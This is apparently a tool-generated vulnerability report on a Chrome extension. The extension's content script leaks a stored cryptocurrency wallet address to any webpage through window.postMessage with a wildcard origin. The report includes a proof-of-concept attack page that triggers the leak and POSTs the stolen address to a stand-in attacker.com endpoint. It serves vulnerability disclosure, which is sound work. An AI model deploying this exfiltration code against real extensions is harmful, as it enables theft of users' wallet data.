# CoCo Analysis: afeibjjgfjfphjedhdjgbgbhpomolbjm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (storage_local_get_source → window_postMessage_sink)

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/afeibjjgfjfphjedhdjgbgbhpomolbjm/opgen_generated_files/cs_0.js
Line 418	var storage_local_get_source = { 'key': 'value' };
Line 702	const dataFromStorage = result.address;
Line 704	window.postMessage(JSON.stringify(msg), "*");

**Code:**

```javascript
// Content script - cs_0.js
// Entry point: webpage sends message to content script
window.addEventListener("message", async function (event) {
  let element;
  try {
    element = JSON.parse(event.data); // ← attacker-controlled
  } catch (e) {
    element = event.data;
  }

  // Handler for "Getwallet" message type
  if (element['Side'] == "webpageMessage" && element["type"] == "Getwallet") {
     getwalletadress(); // Triggers storage read and leak
  }
});

// Function that reads storage and sends it back to webpage
function getwalletadress() {
  chrome.storage.local.get(['address'], function (result) {
    const dataFromStorage = result.address; // ← reads stored wallet address
    msg = {
      "Side": "Content",
      "action": "getdata",
      "type": "OpenApp",
      "data": dataFromStorage // ← wallet address
    };
    window.postMessage(JSON.stringify(msg), "*"); // ← leaks to webpage (attacker)
    return dataFromStorage;
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage listener

**Attack:**

```javascript
// Malicious webpage on any site where extension is active (<all_urls>)
// Step 1: Trigger storage read
window.postMessage(
  JSON.stringify({
    "Side": "webpageMessage",
    "type": "Getwallet"
  }),
  "*"
);

// Step 2: Listen for leaked data
window.addEventListener("message", function(event) {
  try {
    let response = JSON.parse(event.data);
    if (response.Side === "Content" && response.action === "getdata") {
      console.log("Stolen wallet address:", response.data);
      // Exfiltrate to attacker server
      fetch("https://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify({address: response.data})
      });
    }
  } catch(e) {}
});
```

**Impact:** Information disclosure vulnerability. Any malicious webpage can extract the user's cryptocurrency wallet address from extension storage by sending a specially-crafted postMessage. The extension runs on `<all_urls>` (manifest line 31) and posts the sensitive wallet address back to the webpage with `targetOrigin: "*"`, allowing any attacker-controlled site to steal this information. This violates user privacy and could enable targeted attacks against the wallet owner.
